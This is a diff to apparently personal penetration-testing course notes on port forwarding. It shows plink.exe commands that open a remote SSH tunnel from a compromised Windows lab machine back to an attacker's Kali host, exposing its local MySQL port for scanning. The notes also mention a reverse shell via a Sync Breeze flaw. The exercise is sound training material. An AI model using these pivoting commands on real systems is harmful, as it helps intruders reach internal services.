@@ -117,13 +117,15 @@ As we are unable to reach the MYSQL service from our Kali machine we can utiiliz
 `plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`
 
 This will execute plink and instruct it to ssh into our Kali machine with the credentials "kali:ilak" and remote port forward the address/port of our Kali box (10.11.0.4:1234) to the MYSQL port running on localhost (127.0.0.1:3306) We can also pipe "cmd.exe /c echo y" to this command in order provide an answer to the "Store key in chase" question which will be prompted the first time the tool runs.
-`cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`
-`cmd.exe /c echo y | plink.exe -ssh -l kali -pw password1 -R 192.168.119.197:9001:127.0.0.1:3306 192.168.119.197
 
-cmd.exe /c echo y | plink.exe -ssh -l kali -pw password1 -R 192.168.119.197:9001:127.0.0.1:3306 192.168.119.197
+`cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 192.168.119.197:9001:127.0.0.1:3306 192.168.119.197
+
 
 **3.  Scan the MySQL port via the remote port forward.**
 
+Once plink.exe has been executed and the tunnel has been created we can then scan localhost with the port specified in our command and we will be able to enumerate the remote service.
+
+![[plink_nmap.png]]
 
 # 20.4.1 NETSH
 **1.  Obtain a reverse shell on your Windows lab client through the Sync Breeze vulnerability.**
